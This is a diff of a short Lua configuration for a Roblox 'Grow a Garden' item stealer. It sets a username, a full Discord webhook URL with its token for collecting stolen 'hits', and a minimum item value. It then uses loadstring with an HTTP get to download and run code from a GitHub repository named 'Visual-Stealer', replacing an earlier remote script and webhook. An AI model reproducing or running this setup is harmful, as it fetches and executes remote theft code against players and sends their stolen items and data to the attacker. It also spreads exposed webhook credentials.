@@ -1,6 +1,6 @@
 Username = "Supermegabaconv17"
-Webhook = "https://canary.discord.com/api/webhooks/1404267264089391104/8v9dk2qzQJwvXTlD3Fep11efu3vb0V4kG1NEFGbXknjBbX_OjxDtxrA5Etj0iK6Pt2mG"
+Webhook = "https://discord.com/api/webhooks/1404936776082133003/qBX3-ZtSWSTJJCeqMG3Hgp42fRznB9L2NK1Zm0alOThb9J0Kh0eHnqlBiWZi9Lrx6oQs"
 MinimumValue = 1
 DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
 
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Jay-star-bep/Visual-Stealer/refs/heads/main/LONG"))()
